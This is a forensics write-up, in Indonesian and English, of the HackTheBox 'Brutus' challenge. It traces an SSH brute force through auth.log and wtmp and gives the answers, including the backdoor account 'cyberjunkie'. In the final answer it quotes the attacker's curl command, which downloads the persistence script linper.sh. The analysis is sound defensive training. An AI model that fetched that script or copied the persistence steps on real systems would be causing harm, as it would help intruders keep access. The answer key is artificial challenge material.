---
title: "Brutus HTB"
date: 2026-03-04 00-00-00 
categories: [Blue Team]
authors: [fachri]
tags: [CTF,Forensic,Bootcamp,logs]   
toc: true
comments: false
description: Brutus By HackTheBox
media_subpath: /assets/img/BrutusHTB
---
<!-- Masukkan Image Atau Vid Ke /content
Untuk memanggil bisa ![Coba Image](/content/img/berdua.jpeg) _foto Beduaa_ 
Full Documentasi cara menulis bisa dilihat di https://chirpy.cotes.page/posts/write-a-new-post/
-->
# Brutus Hack The Box

![alt text](/content/img/brutusHTB/10.png)

## Deskripsi Soal

In this very easy Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.

### Soal 1

Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?

#### Penjelasan 
Disini kita harus mencari IP dari penyerang yang menyerang server 

![alt text](/content/img/brutusHTB/1.png)

Jika kita lihat auth.log terdapat log yang dimana ketika penyerang melakukan brute force IP dari penyerang terekam di log tersebut

#### Jawaban

65.2.161.68

### Soal 2

The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?

#### Penjelasan 
Disini kita harus mencari username akun apa yang berhasil login di server

![alt text](/content/img/brutusHTB/2.png)

Jika kita lihat auth.log, username yang berhasil login ke dalam server adalah username root 

#### Jawaban
root
### Soal 3

Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact.

#### Penjelasan
Di Soal ini kita harus mencari waktu dimana Attacker login secara manual di server dengan format waktu UTC (Coordinated Universal Time)

di soal kita sudah diberikan script python untuk mengubah file wtmp ke format yang mudah di baca

![alt text](/content/img/brutusHTB/3.png)

Dan jika kita perhatikan, Attacker Login pada 2024-03-06 13:32:45 melalui device IP attacker 65.2.161.68 
![alt text](/content/img/brutusHTB/4.png)

Dikarenakan kali linux saya menggunakan timezone WIB, maka kita perlu mengubah waktunya

>Waktu Indonesia Barat (WIB) adalah UTC+7, yang berarti WIB lebih cepat 7 jam daripada UTC. Untuk konversi, kurangi 7 jam dari waktu WIB (WIB - 7 jam = UTC). Sebaliknya, tambahkan 7 jam ke waktu UTC (UTC + 7 jam = WIB)

#### Jawaban
2024-03-06 06:32:45
### Soal 4

SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?

#### Penjelasan 
Pada Soal ini, Kita harus mencari session number yang terbuka ketika attacker berhasil login

![alt text](/content/img/brutusHTB/5.png)

Jika kita lihat di auth.log, disini session yang terbuka ketika attacker berhasil login adalah session 37
#### Jawaban

37

### Soal 5

The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?

#### Penjelasan 

Pada soal ini, Kita mencari username yang baru di buat oleh attacker untuk mendapatkan akses persisten di dalam server dan akses yang lebih tinggi

![alt text](/content/img/brutusHTB/6.png)

jika kita lihat auth.log, terdapat log yang dimana attacker membuat user baru bernama cyberjunkie dan memberikan akses sudo pada user tersebut

#### Jawaban

cyberjunkie

### Soal 6

What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?

#### Penjelasan 

Disini kita mencari sub teknik MITRE Attack dari serangan pembuatan akun tersebut 

![alt text](/content/img/brutusHTB/11.png)

Jika kita buka website https://attack.mitre.org/ terdapat teknik yang dimana user membuat account untuk akses ke akun korban namun, terdapat perbedaan tentang dimana akun itu di buat, dalam kasus ini attacker membuat user di server korban sehingga masuk kedalam kategori local account

#### Jawaban

T1136.001

### Soal 7

What time did the attacker's first SSH session end according to auth.log?

#### Penjelasan 

Disini kita harus mencari kapan user mengakhiri ssh session pertamanya berdasarkan dari auth.log

![alt text](/content/img/brutusHTB/8.png)

Jika kita lihat dari log tersebut user mengakhiri SSH session nya pada 6 Maret Jam 06:37:24
#### Jawaban

2024-03-06 06:37:24

### Soal 8

The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?

#### Penjelasan 
Setelah Attacker Login menggunakan Akun yang telah dibuat,Dia menjalankan beberapa perintah untuk memperoleh akses yang lebih 

![alt text](/content/img/brutusHTB/9.png)

Attacker menjalankan command 

```Bash
curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```
Di Binaries Local
#### Jawaban

/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh

